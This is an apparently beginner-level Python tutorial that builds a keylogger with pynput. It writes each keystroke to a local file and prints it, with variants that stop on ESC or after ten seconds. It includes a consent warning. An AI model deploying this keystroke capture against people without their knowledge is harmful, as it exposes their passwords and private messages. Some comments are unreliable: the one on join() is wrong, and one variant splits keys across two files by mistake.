# Keylogger tutorial 1
# A keylogger is a program that records the keystrokes on a computer
# This is a simple keylogger that records the keystrokes and writes them to a file
# we will use the pynput library to record the keystrokes
# pynput is a library that allows you to control and monitor input devices
# To install pynput use the command pip install pynput or py -m pip install pynput

'''❌ Warning: Keylogging without consent is illegal! and can lead to serious consequences.(fines, imprisonment, etc.)
You should never use this code to log someone's keystrokes without their permission.
Use it only for ethical hacking, forensics, or educational purposes.'''

from pynput import keyboard # Import the keyboard module from the pynput library

def keyPressed(key): # Define a function that will be called when a key is pressed
    """Function to log keypresses."""
    print(str(key)) # Print the key that was pressed

    # create a file and open it in append mode to record the keypress
    with open("keylog.txt", "a") as file: # will create a file called keylog.txt in the same directory as the script
        file.write(str(key)) # Write the key to the file as a string

    # Stop when 'ESC' is pressed
    if key == keyboard.Key.esc:
        print("\nESC key detected. Stopping the keylogger...")
        listener.stop() # Stop the listener 

# Start the listener
listener = keyboard.Listener(on_press=keyPressed) # listener instance that will call the keyPressed function when a key is pressed
listener.start() # Start the listener 
listener.join()  # Keeps the program running until ESC is pressed it also adds single quotes (' ') to each key to make sure the keys are joined together

print("Keylogger stopped.") 


'''
#Another way to handle stopping the key logger using a function called on_release
#We are also going to include error handling

from pynput import keyboard #import the keyboard module from the pynput library


def on_press(key): #define a function that will be called when a key is pressed
    try:
        with open("keylog.txt", "a") as file: #open the log file in append mode
                file.write(f"{key.char}") #writes each character that was pressed to the file
    except AttributeError:
        with open("log.txt", "a") as file:
                file.write(f"{key}") #if the key is not a character, write the key to the file

def on_release(key): #define a function that will be called when a key is released
        if key == keyboard.Key.esc: #if the key released is the escape key
            return False #stop the listener

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: #create a listener that will call the on_press and on_release functions
        listener.join() #start the listener
'''

'''
# Add a time limit to the keylogger
# A keylogger that stops after a certain time limit
# This stops when either 10 seconds pass or you press ESC:

from pynput import keyboard
import time 

stop_flag = False  # A flag to signal when to stop

def keyPressed(key):
    """Function to log keypresses."""
    global stop_flag
    print(str(key))
    with open("keylog.txt", "a") as f:
        f.write(str(key))

    # Stop when 'ESC' is pressed
    if key == keyboard.Key.esc:
        print("\nESC key detected. Stopping the keylogger...")
        stop_flag = True
        listener.stop()

# Start the listener
listener = keyboard.Listener(on_press=keyPressed)
listener.start()

# Run for a max of 10 seconds or until ESC is pressed
timeout = 10  # Time limit in seconds
start_time = time.time()

while time.time() - start_time < timeout and not stop_flag:
    time.sleep(0.1)  # Prevents high CPU usage

# Stop the listener if time runs out
if not stop_flag:
    print("\nTime limit reached. Stopping the keylogger...")
    listener.stop()

listener.join()  # Ensure cleanup
print("Keylogger stopped.")
'''